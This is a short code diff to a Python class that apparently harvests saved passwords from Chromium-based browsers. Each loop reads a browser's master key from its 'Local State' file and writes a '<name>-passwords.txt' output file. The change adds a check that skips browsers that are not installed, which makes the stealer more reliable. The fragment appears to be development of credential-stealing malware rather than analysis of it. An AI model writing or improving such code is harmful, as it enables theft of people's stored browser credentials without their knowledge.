@@ -32,6 +32,9 @@ class chromium():
         ]
 
         for name, path in self.browsers.items():
+            if not os.path.isdir(path):
+                continue
+                
             self.masterkey = self.get_master_key(path + '\\Local State')
             self.files = [
                 '.\\' + name + '-passwords.txt',
